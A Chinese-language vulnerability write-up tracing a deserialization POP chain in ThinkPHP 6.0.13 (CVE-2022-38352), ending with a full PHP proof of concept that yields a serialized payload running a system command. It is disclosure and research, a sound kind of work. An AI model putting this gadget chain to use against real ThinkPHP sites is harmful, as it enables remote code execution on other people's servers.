---
title: tp6.0.13反序列化漏洞
date: 2022-09-29 22:39:55
tags:
     - 漏洞复现
categories:
     - 漏洞复现
---

![image-20220929172159440](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291721537.png?x-oss-process=hzy)

<!--more-->

# 环境配置

```
composer create-project topthink/think tp6
```

搭建本地环境(apache+mysql+ftp),这里需要注意php版本要求7.1+

![image-20220929172326625](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291723732.png?x-oss-process=hzy)

# 漏洞挖掘

对于php反序列化漏洞出发点几乎都是从魔法函数走起，__destruct魔法函数极为常见，这次也是通过这个开始

用的是ps【phpstorm64】，ctrl+shift+f全局搜索__destruct

![image-20220929173226822](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291732893.png?x-oss-process=hzy)

其他的也都大致看了看暂时感觉没啥用，抓住这个看一下，这个可以看到this->lazySave属于可控变量，跟进save方法

> /vendor/topthink/think-orm/src/Model.php

![image-20221024083511569](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240835652.png?x-oss-process=hzy)

![image-20221024083156322](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240831420.png?x-oss-process=hzy)

![image-20221024084029662](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240840748.png?x-oss-process=hzy)

这里我们需要让下面这个if语句不成立，执行这个语句

>  if ($this->isEmpty() || false === $this->trigger('BeforeWrite'))

```
$result = $this->exists ? $this->updateData() : $this->insertData($sequence);
```

首先先看看isEmpty方法，跟进一下看看

![image-20221024084240619](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240842688.png?x-oss-process=hzy)

不难发现，this->data这又是一个可控变量，只需要满足data[]不为空就会返回false

![image-20221024084518255](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240845313.png?x-oss-process=hzy)

然后继续看第二个，跟进trigger()方法

![image-20221024084647049](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240846128.png?x-oss-process=hzy)

可以发现又是个可控变量$this->withiEvent

![image-20221024084727647](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240847710.png?x-oss-process=hzy)

设置withEvent为false，取反之后就是true就会返回true，所以此if语句两个都不成立，就会跳过判断进入想要进入的那个语句

这个语句中exists属于可控变量

![image-20221024084917641](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240849698.png?x-oss-process=hzy)

跟进updateData方法

有点长，粘下来吧

```
    protected function updateData(): bool
    {
        // 事件回调
        if (false === $this->trigger('BeforeUpdate')) {
            return false;
        }

        $this->checkData();

        // 获取有更新的数据
        $data = $this->getChangedData();

        if (empty($data)) {
            // 关联更新
            if (!empty($this->relationWrite)) {
                $this->autoRelationUpdate();
            }

            return true;
        }

        if ($this->autoWriteTimestamp && $this->updateTime) {
            // 自动写入更新时间
            $data[$this->updateTime]       = $this->autoWriteTimestamp();
            $this->data[$this->updateTime] = $data[$this->updateTime];
        }

        // 检查允许字段
        $allowFields = $this->checkAllowFields();

        foreach ($this->relationWrite as $name => $val) {
            if (!is_array($val)) {
                continue;
            }

            foreach ($val as $key) {
                if (isset($data[$key])) {
                    unset($data[$key]);
                }
            }
        }

        // 模型更新
        $db = $this->db();

        $db->transaction(function () use ($data, $allowFields, $db) {
            $this->key = null;
            $where     = $this->getWhere();

            $result = $db->where($where)
                ->strict(false)
                ->cache(true)
                ->setOption('key', $this->key)
                ->field($allowFields)
                ->update($data);

            $this->checkResult($result);

            // 关联更新
            if (!empty($this->relationWrite)) {
                $this->autoRelationUpdate();
            }
        });

        // 更新回调
        $this->trigger('AfterUpdate');

        return true;
    }
```

这里首先trigger可控，又checkdata方法又没定义，都可以跳过

![image-20221024085632858](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240856931.png?x-oss-process=hzy)

直接跟进getChangeData方法

![image-20221024085709754](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240857830.png?x-oss-process=hzy)

$this->force可控，为true时就会返回$this->data，所以也就是$data=$this->data

![image-20221024090149531](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240901602.png?x-oss-process=hzy)

这里我们想进入到checkAllowFields方法需要让上面的if语句不成立

![image-20221024090359381](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240903509.png?x-oss-process=hzy)

简单来说也就是让$data是否为空，这里若为空，就可以不进入if语句，执行到checkAllowFields()

继续跟进到checkAllowFields()

![image-20221024090524878](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240905976.png?x-oss-process=hzy)

这里刚开始的两个变量field和schema都是可控变量，构造为空时就可以进入db方法

![image-20221024090714634](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240907710.png?x-oss-process=hzy)

不难发现这里就会触发_tostring魔法函数，这里的点起到了字符串拼接作用

综上这一部分的pop链子就是这样的

```
__destruct()——>save()——>updateData()——>checkAllowFields()——>db()——>$this->table . $this->suffix（字符串拼接）——>toString()


$this->exists = true;
$this->$withEvent = false;
$this->$lazySave = true;
```

然后后面就是之前的老链子了，tp5的链子

出发点是这个

![image-20221024091215116](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240912197.png?x-oss-process=hzy)

跟进toJson方法

![image-20221024091242743](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240912795.png?x-oss-process=hzy)

继续跟进toArray方法

![image-20221024091310560](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240913643.png?x-oss-process=hzy)

![image-20221024091347858](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240913939.png?x-oss-process=hzy)

在下面这里这个关键函数

![image-20221024091510752](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240915851.png?x-oss-process=hzy)

触发他的条件是

```
this−>visible[key]存在，即this->visible存在键名为key的键，而k e y 则 来 源 于 data的键名，data则来源于this->data，也就是说this−>data和this->visible要有相同的键名$key
```

继续跟进getAttr方法，在这里不难发现，这个地方对于$this->pool->getItem($this->key);调用的同时也触发了__call魔法函数

这个getltem方法在Cgabbel对象中又不存在，所以调用之前会先构造

> __call () 用于**当调用一个对象存在的方法时自动调用**。

![image-20220929174443097](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291744161.png?x-oss-process=hzy)



__call函数调用了log函数之后又去调用record函数

![image-20220929175149787](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291751851.png?x-oss-process=hzy)

![image-20220929175325385](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291753462.png?x-oss-process=hzy)

继续跟进record函数，继续跟进save函数

![image-20220929175451565](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291754640.png?x-oss-process=hzy)

继续调用save函数

![image-20220929175617821](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291756893.png?x-oss-process=hzy)

跟进去

![image-20220929180741660](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291807760.png?x-oss-process=hzy)

这个request类中url会进行解析

![image-20220929181132100](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291811169.png?x-oss-process=hzy)

跟进invoke函数

![image-20220929181247208](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291812279.png?x-oss-process=hzy)

跟进invokeMethod

![image-20220929181355062](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291813136.png?x-oss-process=hzy)

至此链子已经很清晰了，现在构建反序列化入口

> 需要编写一个控制器模块并存在反序列化可控点得以利用此链条

![image-20221024082721287](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240827393.png?x-oss-process=hzy)

访问该路由，传参测试

![image-20221024082751179](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240827252.png?x-oss-process=hzy)

入口点构造成功，下面开始写入poc

最后回到eval函数即可执行RCE

poc如下

```
<?php

namespace League\Flysystem\Cached\Storage{

    class Psr6Cache{
        private $pool;
        protected $autosave = false;
        public function __construct($exp)
        {
            $this->pool = $exp;
        }
    }
}

namespace think\log{
    class Channel{
        protected $logger;
        protected $lazy = true;

        public function __construct($exp)
        {
            $this->logger = $exp; 
            $this->lazy = false;
        }
    }
}

namespace think{
    class Request{
        protected $url;
        public function __construct()
        {
            $this->url = '<?php system(\'calc\'); exit(); ?>';
        }
    }
    class App{
        protected $instances = [];
        public function __construct()
        {
            $this->instances = ['think\Request'=>new Request()];
        }
    }
}

namespace think\view\driver{
    class Php{}
}

namespace think\log\driver{

    class Socket{
        protected $config = [];
        protected $app;
        protected $clientArg = [];

        public function __construct()
        {
            
            $this->config = [
                'debug'=>true,
                'force_client_ids' => 1,
                'allow_client_ids' => '',
                'format_head' => [new \think\view\driver\Php,'display'], # 利用类和方法
            ];
            $this->app = new \think\App();
            $this->clientArg = ['tabid'=>'1'];
        }
    }
}

namespace{
    $c = new think\log\driver\Socket();
    $b = new think\log\Channel($c);
    $a = new League\Flysystem\Cached\Storage\Psr6Cache($b);
    echo urlencode(serialize($a));
}
```

![image-20220929181920152](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291819220.png?x-oss-process=hzy)



![image-20221024082945940](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210240829084.png?x-oss-process=hzy)

# 后言

![image-20220929182059025](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291820117.png?x-oss-process=hzy)

已提交CVE，编号CVE-2022-38352

https://github.com/top-think/framework/issues/2749

浅浅总结一下，找洞的秘诀是细心！耐心！